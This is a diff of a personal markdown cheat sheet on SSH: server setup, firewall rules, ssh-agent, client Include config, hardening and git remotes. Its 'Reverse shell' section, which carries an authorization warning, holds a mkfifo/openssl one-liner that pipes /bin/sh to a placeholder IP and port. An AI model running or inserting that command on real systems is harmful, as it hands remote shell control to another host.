@@ -1,5 +1,7 @@
 # SSH
 
+---
+
 ## Enable SSH Server (Debian)
 
 ```bash
@@ -20,6 +22,8 @@ sudo firewall-cmd --permanent --add-service=ssh
 sudo firewall-cmd --reload
 # sudo firewall-cmd --list-all # Just to comfirm
 ```
+
+---
 
 ## SSH Agent
 List ssh-agent keys
@@ -81,6 +85,18 @@ Check SSH Configuration
 Global configuration filepath
 `/etc/ssh/ssh_config`
 
+### SSH client `Include`
+In order to include in the `~/.ssh/config` another configuration use the `Include` keyword.
+
+E.g.
+
+```
+# In ~/.ssh/config
+Include servers/config
+
+Host ...
+```
+
 ### Disable both password and keyboard-interactive
 
 1. `sudo vim /etc/ssh/sshd_config`
@@ -133,8 +149,9 @@ git remote set-url origin git@github.com:Username/repository-name.git
 # Inspect remotes again
 ```
 
-## Reverse shell 
+---
 
+## Reverse shell 
 
 > [!WARNING]
 > Use reverse shell only on systems that you have explicit authorization to access.
@@ -199,3 +216,5 @@ On the **target**:
 ```
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ip>:<port> > /tmp/s
 ```
+
+---
